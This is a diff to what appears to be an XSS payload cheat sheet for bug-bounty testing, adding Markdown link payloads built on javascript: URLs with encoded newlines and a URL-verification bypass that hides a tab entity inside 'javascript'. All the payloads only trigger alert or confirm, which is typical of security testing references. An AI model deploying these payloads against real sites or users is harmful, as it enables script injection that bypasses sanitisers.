@@ -142,3 +142,23 @@ foo="text</script><script>alert(123)</script>";
 <x onmouseover=alert(123)>mouseover here
 <x/onmouseover=alert(123)>mouseover here
 ```
+
+
+Refer: https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
+
+### Markdown Payloads
+
+```
+[a](javascript:confirm(123))
+[a](javascript://www.google.com%0Aconfirm(123))
+[a](javascript://%0D%0Aconfirm(123))
+[a](javascript://%0D%0Aconfirm(123);com)
+[a](javascript:window.onerror=confirm;throw%201)
+[a]: (javascript:confirm(123))
+```
+
+### URL Verification Bypass (works without &amp#x09; too)
+
+```
+javas&#x09;cript://www.google.com/%0Aalert(1)
+```
